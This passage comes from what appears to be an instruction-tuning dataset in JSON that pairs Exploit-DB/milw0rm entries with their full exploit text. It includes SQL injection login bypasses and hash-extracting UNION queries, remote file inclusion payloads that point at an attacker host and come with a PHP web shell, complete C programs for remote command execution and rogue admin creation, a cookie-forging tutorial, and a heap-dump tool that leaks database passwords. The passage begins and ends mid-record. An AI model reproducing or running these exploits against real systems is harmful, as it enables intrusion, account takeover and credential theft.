            "Exploit": "/*==========================================*/\n// GHC -> Chipmunk forum <- ADVISORY\n// Product: Chipmunk Forums\n// URL: http://www.chipmunk-scripts.com/board\n// VULNERABILITY CLASS: SQL injection\n// RISK: hight\n/*==========================================*/\n\n[exploit]\nat login.php enter user name as\nAdministrator'/*\n\n# milw0rm.com [2005-02-10]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 808",
        "output": {
            "ID": "808",
            "File": "exploits/php/webapps/808.txt",
            "Description": "CMScore - SQL Injection",
            "Date Published": "2005-02-10",
            "Author": "GHC",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2005-02-09",
            "Date Updated": "",
            "Verified": "1",
            "Codes": [
                "OSVDB-13573;CVE-2005-0368"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "/*==========================================*/\n// GHC -> CMS CORE <- ADVISORY\n// Product: CMS Core\n// URL: http://chipmunk-scripts.com/scripts/cmscore.php\n// VULNERABILITY CLASS: SQL injection\n/*==========================================*/\n\n[exploit]\nLog in with username\nAdministrator'/*\nfrom admin/index.php page.\n\n# milw0rm.com [2005-02-10]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 870",
        "output": {
            "ID": "870",
            "File": "exploits/php/webapps/870.txt",
            "Description": "Download Center Lite (DCL) 1.5 - Remote File Inclusion",
            "Date Published": "2005-03-10",
            "Author": "Filip Groszynski",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2005-03-09",
            "Date Updated": "",
            "Verified": "1",
            "Codes": [
                "OSVDB-14568;CVE-2005-0680"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "Example:\n\n  if register_globals=on and allow_url_fopen=on:\n    http://[victim]/[dir]/inc/download_center_lite.inc.php?script_root=http://[hacker_box]/\n\n# milw0rm.com [2005-03-10]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 1003",
        "output": {
            "ID": "1003",
            "File": "exploits/php/webapps/1003.c",
            "Description": "Fusion SBX 1.2 - Remote Command Execution",
            "Date Published": "2005-05-20",
            "Author": "Silentium",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2005-05-19",
            "Date Updated": "",
            "Verified": "1",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "/*****************************************************\n*                                                    *\n*  [Fusion SBX <= 1.2] exploit                       *\n*                                                    *\n*  sileFSBXxpl                                       *\n*                                                    *\n*  This exploit use vulnerability found into         *\n*  Fusion SBX and create new variable and call it    *\n*  with a malicious function (stored in config.php). *\n*  This exploit utilize injection of three diverse   *\n*  procedures for execution of arbitrary code on     *\n*  vulnerable machine with httpd privileges.         *\n*                                                    *\n*  References: www.securityfocus.org/bid/13575       *\n*                                                    *\n*  coded by: Silentium of Anacron Group Italy        *\n*      date: 10/05/2005                              *\n*    e-mail: anacrongroupitaly[at]autistici[dot]org  *\n*   my_home: www.autistici.org/anacron-group-italy   *\n*                                                    *\n*  this tool is developed under GPL license          *\n*  no(c) .:. copyleft                                *\n*                                                    *\n*****************************************************/\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <netdb.h>\n\n#define PORT 80\t\t// port of web server\n\nvoid info(void);\nvoid banner(void);\nvoid sendxpl(FILE *out, char *argv[], int type);\nvoid errsock(void);\nvoid errgeth(void);\nvoid errconn(char *argv[]);\n\n\nint main(int argc, char *argv[]){\n\nFILE *out;\nint sock, sockconn, type;\nstruct sockaddr_in addr;\nstruct hostent *hp;\n\nif(argc!=4)\n   info();\n\ntype = atoi(argv[3]);\n\nif(type < 1 || type > 3)\n   info();\n\nbanner();\n\nif((sock = socket(AF_INET,SOCK_STREAM,0)) < 0)\n   errsock();\n\n   printf(\"[*] Creating socket\t\t[OK]\\n\");\n\nif((hp = gethostbyname(argv[1])) == NULL)\n   errgeth();\n\n   printf(\"[*] Resolving victim host\t[OK]\\n\");\n\nmemset(&addr,0,sizeof(addr));\nmemcpy((char *)&addr.sin_addr,hp->h_addr,hp->h_length);\naddr.sin_family = AF_INET;\naddr.sin_port = htons(PORT);\n\nsockconn = connect(sock,(struct sockaddr *)&addr,sizeof(addr));\nif(sockconn < 0)\n   errconn(argv);\n\n   printf(\"[*] Connecting at victim host   [OK]\\n\");\n\nout = fdopen(sock,\"a\");\nsetbuf(out,NULL);\n\nsendxpl(out,argv,type);\n\n   printf(\"[*] Now test at execute code on\\n\\n\"\n          \"[1] %s%sindex.php?sile=id\\n\"\n          \"[2] %s%sadmin/index.php?sile=id\\n\\n\",argv[1],argv[2],argv[1],argv[2]);\n\nshutdown(sock,2);\nclose(sock);\n\nreturn 0;\n\n}\n\n\nvoid info(void){\n\nsystem(\"clear\");\nprintf(\"\\n   #########################################\\n\"\n       \"   #             sileFSBXxpl               #\\n\"\n       \"   #  ###################################  #\\n\"\n       \"   #       Fusion SBX <= 1.2 exploit       #\\n\"\n       \"   #       Remote Command Execution        #\\n\"\n       \"   #          coded by Silentium           #\\n\"\n       \"   #        [ Anacron Group Italy ]        #\\n\"\n       \"   #  ###################################  #\\n\"\n       \"   # www.autistici.org/anacron-group-italy #\\n\"\n       \"   #########################################\\n\\n\"\n       \" [Usage]\\n\\n\"\n       \"  sileFSBXxpl <victim> <path_sbx> <type>\\n\\n\"\n       \"        [Type]\\n\\n\"\n       \"              1) injection of system()\\n\"\n       \"              2) injection of exec()\\n\"\n       \"              3) injection of passthru()\\n\\n\"\n       \" [Example]\\n\\n\"\n       \"  sileFSBXxpl www.victim.com /sbx/ 1\\n\\n\");\nexit(1);\n\n}\n\n\nvoid banner(void){\n\nsystem(\"clear\");\nprintf(\"[-] sileFSBXxpl\\n\"\n       \"    ============\\n\"\n       \"[-] Fusion SBX <= 1.2 exploit\\n\"\n       \"[-] coded by Silentium - Anacron Group Italy\\n\"\n       \"[-] www.autistici.org/anacron-group-italy\\n\\n\");\n\n}\n\n\nvoid sendxpl(FILE *out, char *argv[], int type){\n\nchar *call;\nint size = 245;\n\nif(type == 1)\n   call = \"system\";\nelse if(type == 2)\n   call = \"exec\";\nelse if(type == 3)\n   call = \"passthru\";\n\nsize+=strlen(call);\n\nfprintf(out,\"POST %sadmin/?settings HTTP/1.0\\n\"\n            \"Connection: Keep-Alive\\n\"\n            \"Pragma: no-cache\\n\"\n            \"Cache-control: no-cache\\n\"\n            \"Accept: text/html, image/jpeg, image/png, text/*, image/*, */*\\n\"\n            \"Accept-Encoding: x-gzip, x-deflate, gzip, deflate, identity\\n\"\n            \"Accept-Charset: iso-8859-1, utf-8;q=0.5, *;q=0.5\\n\"\n            \"Accept-Language: en\\n\"\n            \"Host: %s\\n\"\n            \"Content-Type: application/x-www-form-urlencoded\\n\"\n            \"Content-Length: %d\\n\\n\"\n            \"set2=basic&admin_set2=standard&lang2=english&plimit2=10&noname2=Guest&\"\n            \"refresh2=120&maxname2=30%%3B%%40%s%%28%%24_GET%%5Bsile%%5D%%29&maxmess\"\n            \"2=120&maxlink2=120&wordbanning2=1&maxword2=20&wrapstat2=1&postorder2=1\"\n            \"&setsubmit=Commit+Changes&is_logged=1\\n\\n\",argv[2],argv[1],size,call);\n\n            printf(\"[*] Sending exploit\t\t[OK]\\n\\n\");\n\n}\n\n\nvoid errsock(void){\n\nsystem(\"clear\");\nprintf(\"[x] Creating socket\t[FAILED]\\n\\n\");\nexit(1);\n\n}\n\n\nvoid errgeth(void){\n\nprintf(\"[x] Resolving victim host\t[FAILED]\\n\\n\");\nexit(1);\n\n}\n\n\nvoid errconn(char *argv[]){\n\nprintf(\"[x] Connecting at victim host\t[FAILED]\\n\\n\",argv[1]);\nexit(1);\n\n}\n\n// milw0rm.com [2005-05-20]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 1014",
        "output": {
            "ID": "1014",
            "File": "exploits/php/webapps/1014.txt",
            "Description": "Invision Power Board 2.0.3 - 'login.php' SQL Injection (Tutorial)",
            "Date Published": "2005-05-27",
            "Author": "Danica Jones",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2005-05-26",
            "Date Updated": "2018-01-18",
            "Verified": "1",
            "Codes": [
                "CVE-2005-1598;OSVDB-16297"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# danica jones <danica6699@gmail.com>\n\nTutorial for the recent exploit released by Petey Beege.\n\n1. Get the exploit from http://www.milw0rm.com/id.php?id=1013 (https://www.exploit-db.com/exploits/1013/)\n2. Make sure you have LWP::UserAgent perl module if not do this:\n     a. perl -MCPAN -e 'shell'\n     b. inside the perl shell, do this 'install LWP::UserAgent'\n3. Run the exploit. Get the password hash for the desired login id\n\nex. inv.pl http://forums.example.com 2 2\n\nWhere 2 is the login id and 2 for version 2 of IPB.\n\n4. Open wordpad. Edit Mozilla Firefox's cookie file. Mine is located at\n\nC:\\Documents and Settings\\the1\\Application Data\\Mozilla\\Firefox\\Profiles\\vspyhjb9.default\\cookies.txt\"\n\nAdd the following entries:\n\nforums.example.com        FALSE        /        FALSE\t\t1148708747\t  member_id        1\nforums.example.com        FALSE        /        FALSE\t\t1148708747        pass_hash        ecb735f70028a9cdb819828f4aced78c\n\nNotice the value of member_id and pass_hash taken from the values\ngenerated by the exploit.\n\n5. Fire up Mozilla Firefox and login to http://forums.example.com\n\nEnjoy!\n\n\n# milw0rm.com [2005-05-27]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 814",
        "output": {
            "ID": "814",
            "File": "exploits/php/webapps/814.txt",
            "Description": "MercuryBoard 1.1.1 - SQL Injection",
            "Date Published": "2005-02-12",
            "Author": "Zeelock",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2005-02-11",
            "Date Updated": "2016-04-28",
            "Verified": "1",
            "Codes": [
                "OSVDB-13267;CVE-2005-0414"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.commercuryboard-beta1.tar.gz",
            "Source URL": "",
            "Exploit": "# little late posting this /str0ke\n\nExploit:\n\nhttp://www.site.com/mercuryboard/index.php?a=post&s=reply&t=1&qu=10000%20UNION%20SELECT%20user_password,user_name%20from%20mb_users%20where%20user_group%20=%201%20limit%201/*\n\n# milw0rm.com [2005-02-12]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 635",
        "output": {
            "ID": "635",
            "File": "exploits/php/webapps/635.txt",
            "Description": "MiniBB 1.7f - 'user' SQL Injection",
            "Date Published": "2004-11-16",
            "Author": "anonymous",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2004-11-15",
            "Date Updated": "2016-11-24",
            "Verified": "1",
            "Codes": [
                "OSVDB-11711;CVE-2004-2456"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "Example:\n\n http://[target]/minibb/index.php?action=userinfo&user=1%20union%20select%201,2,user_password%20from%20minibb_users/*\n\n# milw0rm.com [2004-11-16]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 807",
        "output": {
            "ID": "807",
            "File": "exploits/php/webapps/807.txt",
            "Description": "MyPHP Forum 1.0 - SQL Injection",
            "Date Published": "2005-02-10",
            "Author": "GHC",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2005-02-09",
            "Date Updated": "",
            "Verified": "1",
            "Codes": [
                "OSVDB-13679;CVE-2005-0413"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "/*==========================================*/\n// GHC -> MyPHP Forum <- ADVISORY\n// Product: MyPHP Forum\n// Version: 1.0\n// URL: http://www.myphp.ws\n// VULNERABILITY CLASS: SQL injection\n/*==========================================*/\n\n[example of exploit]\nmember.php?action=viewpro&member=nonexist' UNION SELECT uid, username, password, status, email, website, aim, msn, location, sig, regdate, posts, password as yahoo FROM nb_member WHERE uid='1\n\n/* will show administrator's name and password hash (in the \"Yahoo\" field). */\n\n# milw0rm.com [2005-02-10]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 574",
        "output": {
            "ID": "574",
            "File": "exploits/php/webapps/574.txt",
            "Description": "ocPortal 1.0.3 - Remote File Inclusion",
            "Date Published": "2004-10-13",
            "Author": "Exoduks",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2004-10-12",
            "Date Updated": "",
            "Verified": "1",
            "Codes": [
                "OSVDB-10712;CVE-2004-1592"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "http://localhost/ocp-103/index.php?req_path=http ://evil-host/\n\n\n\nOn your evil host you must put scipt funcs.php.\n\nExample of funcs.php if your host doesn't support php.\n\n\n\n   <?php\n\n     $com = $_GET[\"com\"];\n\n     system (\"$com\");\n\n   ?>\n\n\n\n  Example of funcs.php if your host support php.\n\n\n\n   <?php\n\n     echo '<?php $com = $_GET[\"com\"]; system (\"$com\"); ?>';\n\n   ?>\n\n\n\n  http://localhost/ocp-103/index.php?req_path=http://evil-host/&com=ls\n\n\n# milw0rm.com [2004-10-13]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 866",
        "output": {
            "ID": "866",
            "File": "exploits/php/webapps/866.c",
            "Description": "paNews 2.0b4 - Remote Admin Creation SQL Injection",
            "Date Published": "2005-03-08",
            "Author": "Silentium",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2005-03-07",
            "Date Updated": "",
            "Verified": "1",
            "Codes": [
                "OSVDB-15452;CVE-2005-0647"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "/***************************************************\n*                                                  *\n* paNews v2.0b4                                    *\n*                                                  *\n* silePNEWSxpl                                     *\n* This exploit utilize SQL injection for create    *\n* a new user with admin privileges on paNews       *\n* software system.                                 *\n*                                                  *\n* References:                                      *\n* packetstormsecurity.org/0503-exploits/panews.txt *\n                         *\n*                                                  *\n* coded by: Silentium of Anacron Group Italy       *\n*     date: 04/03/2005                             *\n*   e-mail: anacrongroupitaly[at]autistici[dot]org *\n*  my_home: www.autistici.org/anacron-group-italy  *\n*                                                  *\n* this tool is developed under GPL license         *\n* no(c) .:. copyleft                               *\n*                                                  *\n***************************************************/\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <netdb.h>\n\n#define PORT 80                 // port of the web server\n\nvoid info(void);\nvoid sendxpl(int sock, char *argv[]);\nvoid errsock(void);\nvoid errgeth(void);\nvoid errconn(void);\n\nint main(int argc, char *argv[]){\n\nint sock, sockconn;\nstruct sockaddr_in addr;\nstruct hostent *hp;\n\nif(argc!=4)\n  info();\n\nif((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)\n  errsock();\n\nsystem(\"clear\");\nprintf(\"[*] Creating socket             [OK]\\n\");\n\nif((hp = gethostbyname(argv[1])) == NULL)\n  errgeth();\n\nprintf(\"[*] Resolving victim host       [OK]\\n\");\n\nmemset(&addr,0,sizeof(addr));\nmemcpy((char *)&addr.sin_addr,hp->h_addr,hp->h_length);\naddr.sin_family = AF_INET;\naddr.sin_port = htons(PORT);\n\nsockconn = connect(sock,(struct sockaddr *)&addr,sizeof(addr));\nif(sockconn < 0)\n  errsock();\n\nprintf(\"[*] Connecting at victim host   [OK]\\n\");\n\nsendxpl(sock, argv);\n\nprintf(\"[*] Now check on\\n\"\n      \"    http://%s%s\\n\\n\"\n      \"    your username: %s\\n\"\n      \"    with password: anacron\\n\\n\",argv[1],argv[2],argv[3]);\n\nshutdown(sock, 2);\nclose(sock);\n\nreturn(0);\n\n}\n\nvoid info(void){\n\nsystem(\"clear\");\nprintf(\"#########################################\\n\"\n      \"# paNews v2.0b4 exploit                 #\\n\"\n      \"#########################################\\n\"\n      \"# this exploit create a new user admin  #\\n\"\n      \"# on paNews software system.            #\\n\"\n      \"# exploit coded by Silentium            #\\n\"\n      \"# Anacron Group Italy                   #\\n\"\n      \"# www.autistici.org/anacron-group-italy #\\n\"\n      \"#########################################\\n\\n\"\n      \"[usage]\\n\\n\"\n      \" silePNEWSxpl <victim> <path_paNews> <username>\\n\\n\"\n      \"[example]\\n\\n\"\n      \" silePNEWSxpl www.victim.com /panews/index.php silentium\\n\\n\");\nexit(1);\n\n}\n\nvoid sendxpl(int sock, char *argv[]){\n\nFILE *out;\nint size = 264;\nout = fdopen(sock,\"a\");\nsetbuf(out,NULL);\n\nsize+=(strlen(argv[3]) * 2);\n\nfprintf(out,\"POST %s HTTP/1.0\\n\"\n           \"Connection: Keep-Alive\\n\"\n           \"Pragma: no-cache\\n\"\n           \"Cache-control: no-cache\\n\"\n           \"Accept: text/html, image/jpeg, image/png, text/*, image/*, */*\\n\"\n           \"Accept-Encoding: x-gzip, x-deflate, gzip, deflate, identity\\n\"\n           \"Accept-Charset: iso-8859-1, utf-8;q=0.5, *;q=0.5\\n\"\n           \"Accept-Language: en\\n\"\n           \"Host: %s\\n\"\n           \"Referer: http://%s%s\\n\"\n           \"Content-Type: application/x-www-form-urlencoded\\n\"\n           \"Content-Length: %d\\n\\n\"\n           \"action%%3Dlogin%%26username%%3D%s%%26password%%3Danacron%%26\"\n           \"mysql_prefix%%3Dpanews_auth%%60%%20VALUES%%20(%%22%%22,%%22\"\n           \"%s%%22,%%22f63140655b379e65f6cd87fa3c3da631%%22,%%22\"\n           \"hackit%%22,%%22admins%%7Ccat%%7Ccomment%%7Cnewsadd%%7Cnewsedit\"\n           \"%%7Cprefset%%7Csetup%%22,%%22none%%22,%%22127.0.0.1%%22\"\n           \",1,1)%%00\\n\\n\",argv[2],argv[1],argv[1],argv[2],size,argv[3],argv[3]);\n\n           printf(\"[*] Sending exploit         [OK]\\n\\n\");\n\n}\n\nvoid errsock(void){\n\nsystem(\"clear\");\nprintf(\"[x] Creating socket             [FAILED]\\n\\n\");\nexit(1);\n\n}\n\nvoid errgeth(void){\n\nprintf(\"[x] Resolving victim host        [FAILED]\\n\\n\");\nexit(1);\n\n}\n\nvoid errconn(void){\n\nprintf(\"[x] Connecting at victim host    [FAILED]\\n\\n\");\nexit(1);\n\n}\n\n// milw0rm.com [2005-03-08]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 384",
        "output": {
            "ID": "384",
            "File": "exploits/php/webapps/384.txt",
            "Description": "PHP 4.3.7 - 'php-exec-dir' Patch Command Access Restriction Bypass",
            "Date Published": "2004-08-08",
            "Author": "VeNoMouS",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2004-08-07",
            "Date Updated": "2016-12-02",
            "Verified": "1",
            "Codes": [
                "OSVDB-7243;CVE-2004-2692"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comphp-4.3.7.tar.gz",
            "Source URL": "",
            "Exploit": "<?php\n$blah = `& /bin/ps aux`;\necho nl2br($blah);\n?>\n\n<?php\n$blah = `| /bin/ps aux`;\necho nl2br($blah);\n?>\n\n\n# milw0rm.com [2004-08-08]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 697",
        "output": {
            "ID": "697",
            "File": "exploits/php/webapps/697.c",
            "Description": "PHP 4.3.9 + phpBB 2.x - 'Unserialize()' Remote Information Leak",
            "Date Published": "2004-12-17",
            "Author": "overdose",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2004-12-16",
            "Date Updated": "2017-11-22",
            "Verified": "1",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                "phpbbmemorydump.rar"
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comphp-4.3.9.tar.gz",
            "Source URL": "",
            "Exploit": "// Compiled version: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/697.rar (phpbbmemorydump.rar)\n// Source serv.cpp is at the bottom of the page - str0ke\n\n// Notes from author:\n//      compile with borland c++ (freecommandlinetools) :\n//               bcc32 -c serv.cpp\n//               bcc32 bbmemorydump.cpp serv.obj\n\n/*\n       *** coded by overdose ***\n       slythers@gmail.com\n       php bug in ext/standart/var_unserializer.c http://www.securityfocus.com/archive/1/384663/2004-12-13/2004-12-19/0\n       for read heap memorie with phpbb2 ;>\n       tested : phpbbmemorydump.exe \"http://site.com/phpbb/\" 30000 -cookiename=phpbb2support > a.txt\n       result:\n               - string detected : /home/virtual/site.com/phpBB/config.php\n               - string detected : dbname\n               - string detected : PT_N\n               - string detected : phpbb\n               - string detected : dbuser\n               - string detected : phpbb  << mysql user\n               - string detected : dbpasswd\n               - string detected : phpBB_R0cKs << mysql password\n               - string detected : table_prefix\n               - string detected : phpbb_\n       use like :\n               phpbbmemorydump.exe \"http://site.com/phpbb2/\" nboctettoreadinheap [repeat/display_all_heap] [-cookiename=phpbb2mysql]\n       greetz:\n       my crew MWA\n       pull the plug , vortex challenge\n       www.security-challenge.com\n       http://overdose.tcpteam.org/\n       slipknot , dr dre , ...\n       all #s-c and all i forget\n       compile with borland c++ (freecommandlinetools) :\n               bcc32 -c serv.cpp\n               bcc32 bbmemorydump.cpp serv.obj\n*/\n#include <winsock.h>\n#include <iostream.h>\nclass serveur\n{\n public:\n bool createsocket();\n bool listen(unsigned short port,unsigned int nbwaitconnect);\n serveur * waitconnect();\n bool connectsocket(char *dns,unsigned short port);\n bool socketsend(char *envoi);\n bool getword(char in[],unsigned int max);\n bool getword(char in2[]);\n bool getline(char buf[],unsigned int maxcara);\n bool getline(char buf2[]);\n bool ifgetchar(char *caraif);\n bool ifchargetnb(char ligne[],unsigned int aumax);\n bool ifchargetline(char ligne[],unsigned int lemax);\n bool ifchargetline(char ligne[]);\n bool getnb(char *vect,unsigned int nb);\n bool sendnb(char *vec,unsigned int longueur);\n bool isconnect();\n int getnumsock();\n void closesock();\n bool createbytheclass(int thesock,struct sockaddr_in thestruct);\n unsigned int maxread;\n unsigned int seconde;\n unsigned int microseconde;\n serveur();\n ~serveur();\n void operator << (char *chaine);\n void operator >> (char *read);\n\n private:\n bool connected;\n bool create;\n struct sockaddr_in mysock;\n int sock;\n\n};\n#define HTTP_PORT 80\n#define SIGNATURE_REQUEST signaturequete\n#define SIGNATURE_REQUEST_START \"\\nSet-Cookie: \"\n#define DEFAULT_COOKIE_NAME \"phpbb2mysql\"\n#define END_SIGNATURE \"_data=\"\n#define MIN_NB_LETTRE 3\n#define NB_SEC_FOR_WAIT 1000*5 // 5 secondes\nchar signaturequete[512];\nstruct url{\n       char *dns;\n       char *uri;\n       unsigned short port;\n};\n\nstruct url parseurl(char *of);\nchar * intostr(int erf);\nbool goodcar(char carac);\nunsigned int utf8decode(char *utf);\nchar alphanum(char *of,bool *wesh);\nint main(int argc,char **argv)\n{\n       struct url urlparsed;\n       serveur http;\n       unsigned int nbmemread;\n       char car;\n       bool repeat = 0;\n       bool displayheap = 0;\n       char *cookname = DEFAULT_COOKIE_NAME;\n       WSAData wsadata;\n       if (WSAStartup(MAKEWORD(2, 0),&wsadata) != 0)\n               return 1;\n       cout <<\"coded by overdose / bad boyz coding\"<<endl;\n\n       if(argc < 3)\n       {\n               cout <<\"Example: phpbbmemorydump.exe http://site.com/phpbb/ 30000 -cookiename=phpbb2support > a.txt\"<<endl;\n               return 0;\n       };\n\n       for(int argcpt = 3;argcpt < argc;argcpt++)\n       {\n               if(!strcmp(argv[argcpt],\"repeat\"))\n                       repeat = 1;\n               else if(!strcmp(argv[argcpt],\"display_all_heap\"))\n                       displayheap = 1;\n               else if(!strncmp(argv[argcpt],\"-cookiename=\",sizeof(\"-cookiename=\")-1))\n               {\n                       cookname= argv[argcpt] + sizeof(\"-cookiename=\")-1;\n               };\n       };\n\n       strcpy(SIGNATURE_REQUEST,SIGNATURE_REQUEST_START);\n       strcat(SIGNATURE_REQUEST,cookname);\n       strcat(SIGNATURE_REQUEST,END_SIGNATURE);\n       nbmemread = atoi(argv[2]);\n\n       if(!nbmemread)\n               return 0;\n       urlparsed = parseurl(argv[1]);\n       if(!urlparsed.uri)\n               return 0;\n       do{\n               http.createsocket();\n\n               if(!http.connectsocket(urlparsed.dns,urlparsed.port))\n               {\n                       cout << \"can't connect to \"<<urlparsed.dns<<endl;\n                       return 0;\n               };\n\n               http << \"GET \" ;\n               http << urlparsed.uri ;\n               http << \" HTTP/1.1\\nHost: \";\n               http << urlparsed.dns ;\n               http << \"\\nCookie: \";\n               http << cookname;\n               http << \"_data=s:\";\n               http << intostr(nbmemread);\n               http << \":%22test1%22%3b; expires=Fri, 24-Dec-2005 21:25:37 GMT; path=/; domain=\";\n               http << urlparsed.dns;\n               http << \"\\nCookie: \";\n               http << cookname;\n               http << \"_sid=1cfd759c33ba2a45b994c7b7cfd948ec; path=/; domain=\";\n               http << urlparsed.dns;\n               http << \"\\nAccept-Language: fr\\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\nConnection: close\\n\\n\";\n\n               cout <<\"requete effectuer ...\"<<endl;\n               char signature[sizeof(SIGNATURE_REQUEST)];\n               char *word,*wtmp;\n               unsigned int cpt ,sizesign;\n               unsigned int compteur,cptstr;\n               bool exit = 0;\n               sizesign = strlen(SIGNATURE_REQUEST);\n               memset(signature,'a',sizesign);\n               signature[sizesign] ='\\0';\n               compteur = 0;\n               cptstr = 0;\n               while(!exit && http.getnb(&car,sizeof(char)))\n               {\n                       // ajout du detecteur de heap\n                       for(cpt = 0; cpt < (sizesign-1);cpt++)\n                               signature[cpt] = signature[cpt+1];\n                       signature[sizesign-1] = car;\n                       if(!strcmp(signature,SIGNATURE_REQUEST))\n                       {\n                               word = new char[nbmemread*3+1];\n                               word[cptstr] = '\\0';\n                               compteur = strlen(intostr(nbmemread)) + 4;\n                               for(cpt = 0; cpt < compteur;cpt++)\n                                       http.getnb(&car,sizeof(char));\n                               while(!exit && http.getnb(&car,sizeof(char)))\n                               {\n                                       if((car == ';') || (cptstr >= (nbmemread*3)))\n                                       {\n                                               exit = 1;\n                                               continue;\n                                       };\n                                       word[cptstr] = car;\n                                       cptstr++;\n                                       word[cptstr] ='\\0';\n                               };\n                               if(displayheap)\n                                       cout << word<<endl;\n                               nbmemread = utf8decode(word);\n                               for(compteur = 0;compteur < nbmemread;)\n                               {\n                                       for(cpt=compteur;goodcar(word[cpt]);cpt++);\n                                       if((cpt - compteur) > MIN_NB_LETTRE )\n                                       {\n                                               wtmp = new char[(cpt - compteur)+1];\n                                               strncpy(wtmp,&word[compteur],cpt - compteur);\n                                               wtmp[cpt - compteur] = '\\0';\n                                               cout <<\"- string detected : \" <<wtmp<<endl;\n                                               delete[] wtmp;\n                                       }\n                                       if(!(cpt - compteur))\n                                               cpt++;\n                                       compteur = cpt;\n                               };\n                               delete[] word;\n                       };\n               };\n               http.closesock();\n               if(repeat)\n               {\n                       cout <<endl<<\"attente jusqu'a la prochaine requete ...\"<<endl;\n                       Sleep(NB_SEC_FOR_WAIT);\n               };\n       }while(repeat);\n       /*\n       delete[] urlparsed.uri; // removed extra \\n's milw0rm.com\n       delete[] urlparsed.dns;\n       */\n       WSACleanup();\n       return 0;\n}\nstruct url parseurl(char *of)\n{\n       struct url retour;\n       unsigned int taille;\n       char tmp;\n       retour.dns = 0x00;\n       retour.uri = 0x00;\n       retour.port = HTTP_PORT ;\n       while( *of && (*of != ':'))\n               of++;\n       if(*of && *(of+1) && *(of+2))\n       {\n               if((*(of+1) != '/') || (*(of+2) != '/'))\n                       return retour;\n               of += 3;\n               for(taille = 0; (of[taille] != '/') && (of[taille] != '\\0') && (of[taille] != ':');taille++);\n               retour.dns = new char [taille+1];\n               memcpy(retour.dns,of,taille);\n               retour.dns[taille] = '\\0';\n               of += taille;\n               if(*of == ':')\n               {\n                       of++;\n                       for(taille = 0; (of[taille] != '/') && (of[taille] != '\\0');taille++);\n                       tmp = of[taille];\n                       of[taille] = '\\0';\n                       if(taille)\n                               retour.port = atoi(of);\n                       of[taille] = tmp;\n                       of += taille;\n               };\n               if(!*of)\n               {\n                       retour.uri = new char[2];\n                       strcpy(retour.uri,\"/\");\n               }\n               else\n               {\n                       retour.uri = new char [strlen(of)+1];\n                       strcpy(retour.uri,of);\n               };\n       };\n       return retour;\n}\nchar * intostr(int erf)\n{\n       char *chaine;\n       int puissance;\n       int erf2;\n       if( erf >= 0)\n       {\n               puissance =0;\n               for(int kekette = 1;kekette<=erf;kekette = kekette*10)\n               {\n                       puissance++;\n               };\n               if (puissance == 0)\n               {\n                       puissance = 1;\n               };\n               chaine = new char[puissance+1];\n               chaine[puissance] ='\\0';\n               for(int arf = puissance-1;arf >=0;arf--)\n               {\n                       erf2 = erf % 10 ;\n                       chaine[arf] = '0' + 